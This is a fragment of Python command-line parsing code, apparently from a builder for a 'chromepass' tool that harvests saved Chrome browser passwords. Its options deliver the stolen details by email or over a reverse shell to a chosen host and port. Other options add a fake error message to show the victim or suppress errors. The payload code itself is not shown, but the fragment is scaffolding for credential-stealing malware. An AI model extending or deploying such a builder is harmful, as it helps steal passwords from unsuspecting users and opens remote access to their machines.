parser_build_chromepass.add_argument(
        "--load",
        default=False,
        action="store_true",
        required=False)
    parser_build_chromepass.add_argument(
        "--email",
        default=False,
        action="store_true",
        required=False)
    parser_build_chromepass.add_argument(
        "--reverse_shell",
        default=False,
        action='store_true',
        required=False)
    parser_build_chromepass.add_argument(
        "--no_error",
        default=False,
        action='store_true',
        required=False)

    parser_build_chromepass.add_argument(
        "--errormsg",
        type=str,
        metavar=f"Error message to appear",
        required=False)
    parser_build_chromepass.add_argument(
        "--address",
        type=str,
        metavar=f"Email address to send details to, if Email was chosen",
        required=False)
    parser_build_chromepass.add_argument(
        "--port",
        type=int,
        metavar=f"Port for reverse connection, if Reverse shell was chosen.",
        required=False)
    parser_build_chromepass.add_argument(
        "--host",
        type=str,
        metavar=f"Host reverse connection, if Reverse shell was chosen.",
        required=False)

    parser_build_chromepass.set_defaults(func=build_chromepass)

    # Parse the arguments
    args = parser.parse_args()

    # Check for mutually inclusive
    try:

        if args.email and (args.address is None):
            parser.error("--email requires --address")
        elif args.reverse_shell and (args.host is None or args.port is None):
            parser.error("--reverse_shell requires --host and --port.")
    except Exception:
        pass

    try:
        args.func(args)
    except Exception:
        # raise(err)
        return parser.print_help()
    return 0


if __name__ == "__main__":
    getOptions()
